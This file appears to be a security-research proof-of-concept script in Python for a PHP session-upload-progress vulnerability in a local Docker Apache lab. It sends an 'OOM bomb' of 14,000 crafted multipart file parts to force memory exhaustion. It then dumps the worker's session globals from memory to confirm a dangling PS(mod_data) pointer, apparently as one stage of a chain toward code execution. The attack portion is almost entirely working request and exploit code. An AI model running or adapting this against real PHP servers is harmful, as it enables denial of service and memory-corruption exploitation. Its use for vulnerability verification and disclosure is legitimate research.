#!/usr/bin/env python3
"""
Chain D: Direct memory observation of stale PS() after OOM

Reads ps_globals from an Apache worker's memory via docker exec + PHP CLI,
before and after OOM, to prove the dangling pointer in PS(mod_data).

For authorized security research only.
"""

import re
import socket
import subprocess
import sys
import time


def send_raw(host, port, data, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    off = 0
    while off < len(data):
        s.sendall(data[off:off+65536])
        off += 65536
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1]
    return b""


def dump_ps_globals(label):
    """Dump ps_globals from the Apache worker via docker exec."""
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         "WPID=$(pgrep -u www-data apache2 | head -1); "
         "php /var/www/html/mem_dump_cli.php $WPID 2>&1"],
        capture_output=True, text=True, timeout=10)
    output = r.stdout
    print(f"\n{'='*60}")
    print(f"  {label}")
    print(f"{'='*60}")

    pid = None
    ps_fields = {}
    for line in output.split("\n"):
        line = line.strip()
        if line.startswith("Target PID:"):
            pid = line.split(":")[1].strip()
        if line.startswith("PS+"):
            m = re.match(r"PS\+0x([0-9a-f]+):\s+(0x[0-9a-f]+)(.*)", line)
            if m:
                off = int(m.group(1), 16)
                val = int(m.group(2), 16)
                note = m.group(3).strip()
                ps_fields[off] = (val, note)
                print(f"  {line}")
        elif "libphp base" in line:
            print(f"  {line}")

    print()
    return pid, ps_fields


def make_upload_progress_request(host, port, path, boundary, sid, progress_key,
                                  num_files=5, fname_size=20):
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"{progress_key}\r\n"
    )
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * max(1, fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin1")
    cookie = f"PHPSESSID={sid}"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def make_oom_request(host, port, path, boundary, sid, progress_key,
                     num_files=14000, fname_size=500):
    return make_upload_progress_request(
        host, port, path, boundary, sid, progress_key,
        num_files=num_files, fname_size=fname_size)


def main():
    host = "127.0.0.1"
    port = 18081
    boundary = "MEMDUMP_VERIFY"
    sid = "memdumpverify1234567890abcdef"

    print("=" * 60)
    print("  Chain D: Direct PS() Memory Observation")
    print("=" * 60)

    # Clean state
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c", "rm -f /tmp/sess_*"],
        capture_output=True, timeout=5)

    # Warm up - ensure a worker is alive and serving
    req = f"GET /index.php HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    send_raw(host, port, req.encode())
    time.sleep(0.5)

    # ── Step 0: Baseline ──────────────────────────────────────────
    pid0, ps0 = dump_ps_globals("BASELINE (before any session activity)")
    print(f"  Worker PID: {pid0}")
    print(f"  PS+0x068 (session_status): {ps0.get(0x68, ('?','?'))}")

    # ── Step 1: Start session via upload progress ──────────────────
    print("\n[1] Sending multipart + PHP_SESSION_UPLOAD_PROGRESS...")
    req = make_upload_progress_request(
        host, port, "/index.php", boundary, sid, "setup_key",
        num_files=5, fname_size=20)
    resp = send_raw(host, port, req)
    print(f"    Status: {get_status(resp)}")
    time.sleep(0.5)

    # Check session file
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         f"ls -la /tmp/sess_{sid} 2>&1 && wc -c < /tmp/sess_{sid}"],
        capture_output=True, text=True, timeout=5)
    print(f"    Session: {r.stdout.strip()}")

    # Dump PS after session activity
    pid1, ps1 = dump_ps_globals("AFTER SESSION SETUP (session was started via rfc1867)")
    print(f"  Worker PID: {pid1}")
    print(f"  PS+0x068 (session_status): {ps1.get(0x68, ('?','?'))}")

    if pid1 != pid0:
        print(f"  [!] Worker changed! {pid0} -> {pid1}")

    # Compare key fields
    print("\n  Changes from baseline:")
    for off in sorted(set(list(ps0.keys()) + list(ps1.keys()))):
        v0 = ps0.get(off, (0, ""))[0]
        v1 = ps1.get(off, (0, ""))[0]
        if v0 != v1:
            print(f"    PS+0x{off:03x}: 0x{v0:016x} -> 0x{v1:016x}")

    # ── Step 2: OOM bomb ──────────────────────────────────────────
    print("\n[2] Sending OOM bomb + upload_progress...")
    req = make_oom_request(host, port, "/index.php", boundary, sid, "oom_key",
                           num_files=14000, fname_size=500)
    resp = send_raw(host, port, req, timeout=120)
    status = get_status(resp)
    print(f"    Status: {status}")
    if resp:
        body = get_body(resp).decode("latin1", "replace")
        if "tried to allocate" in body or "Allowed memory" in body:
            for line in body.split("\n"):
                if "Allowed memory" in line or "tried to allocate" in line:
                    print(f"    OOM: {line.strip()[:100]}")
                    break
    time.sleep(0.5)

    # ── Step 3: Dump PS after OOM ─────────────────────────────────
    pid2, ps2 = dump_ps_globals("AFTER OOM (stale PS() — ZMM freed but PS not reset)")
    print(f"  Worker PID: {pid2}")
    print(f"  PS+0x068 (session_status): {ps2.get(0x68, ('?','?'))}")

    if pid2 != pid1:
        print(f"  [!] Worker changed! {pid1} -> {pid2}")
        print("  Cannot compare - different worker.")
    else:
        # This is the KEY comparison
        print("\n  Changes from post-session to post-OOM:")
        changed = False
        for off in sorted(set(list(ps1.keys()) + list(ps2.keys()))):
            v1 = ps1.get(off, (0, ""))[0]
            v2 = ps2.get(off, (0, ""))[0]
            if v1 != v2:
                changed = True
                dangling = ""
                # If a pointer from ps1 still appears in ps2 but the ZMM
                # heap has been freed, it's a dangling pointer
                if v2 > 0x5500000000 and v2 < 0x600000000000:
                    dangling = " <<< POTENTIALLY DANGLING (heap ptr after ZMM free)"
                if v2 > 0x7f0000000000 and v2 < 0x800000000000:
                    dangling = " <<< lib/mmap ptr"
                print(f"    PS+0x{off:03x}: 0x{v1:016x} -> 0x{v2:016x}{dangling}")

        # Check for STALE pointers (same as post-session, not reset to baseline)
        print("\n  Stale fields (same as post-session, not reset to baseline):")
        stale_count = 0
        for off in sorted(ps0.keys()):
            v0 = ps0.get(off, (0, ""))[0]
            v1 = ps1.get(off, (0, ""))[0]
            v2 = ps2.get(off, (0, ""))[0]
            if v0 != v1 and v1 == v2:
                stale_count += 1
                print(f"    PS+0x{off:03x}: baseline=0x{v0:016x}, "
                      f"post-session=post-oom=0x{v1:016x} <<< STALE")
            elif v0 != v2 and v0 != v1:
                # Changed from baseline AND different from post-session
                if v2 != 0:
                    print(f"    PS+0x{off:03x}: baseline=0x{v0:016x}, "
                          f"post-session=0x{v1:016x}, post-oom=0x{v2:016x}")

        if not changed and stale_count == 0:
            # Check if PS retained session values after OOM
            # The session_status field is particularly telling
            s_status_post = ps2.get(0x68, (0, ""))[0]
            s_status_base = ps0.get(0x68, (0, ""))[0]
            if s_status_post != s_status_base:
                print(f"    PS+0x068 (session_status): NOT RESET! "
                      f"baseline={s_status_base}, now={s_status_post}")
                stale_count += 1

    # ── Step 4: Follow-up request - check PHP-level stale state ────
    print("\n[3] Sending follow-up multipart to ps_probe.php...")
    req = make_upload_progress_request(
        host, port, "/ps_probe.php", boundary, sid, "followup_key",
        num_files=3, fname_size=20)
    resp = send_raw(host, port, req)
    body = get_body(resp).decode("latin1", "replace")
    print(f"    Status: {get_status(resp)}")

    findings = []
    for line in body.split("\n"):
        s = line.strip()
        if "!!!" in s or "SESSION" in s or "session_status" in s or "PID" in s:
            print(f"    {s}")
            if "!!!" in s:
                findings.append(s)

    # ── Results ───────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("  RESULTS")
    print("=" * 60)
    print()

    if pid2 == pid1:
        print(f"  Worker survived OOM: YES (PID {pid2})")
    else:
        print(f"  Worker changed: {pid1} -> {pid2}")

    if findings:
        print(f"  PHP-level stale state: DETECTED ({len(findings)} indicators)")
        for f in findings:
            print(f"    - {f}")

    # Check for dangling pointers
    if pid2 == pid1:
        dangling_found = False
        for off in sorted(ps1.keys()):
            v1 = ps1.get(off, (0, ""))[0]
            v2 = ps2.get(off, (0, ""))[0]
            v0 = ps0.get(off, (0, ""))[0]
            # A pointer that was set during session activity and persists
            # after OOM (when ZMM has been freed) is dangling
            if (v0 == 0 or v0 == 1) and v1 != v0 and v2 == v1:
                if v2 > 0x5500000000:
                    dangling_found = True
                    print(f"  DANGLING PTR at PS+0x{off:03x}: 0x{v2:016x} "
                          f"(set during session, persists after ZMM free)")

        if dangling_found:
            print()
            print("  [+] DANGLING POINTERS CONFIRMED IN PS()")
            print("  These point into freed ZMM heap from previous request.")
            print("  PS(mod_data) contains a dangling ps_files* struct pointer.")
            print("  This is the CVE-2026-109618 Chain D vulnerability.")
        else:
            print("  No obvious dangling pointers detected in first 16 fields.")
            print("  The stale state may be in later fields or normalized by RSHUTDOWN.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
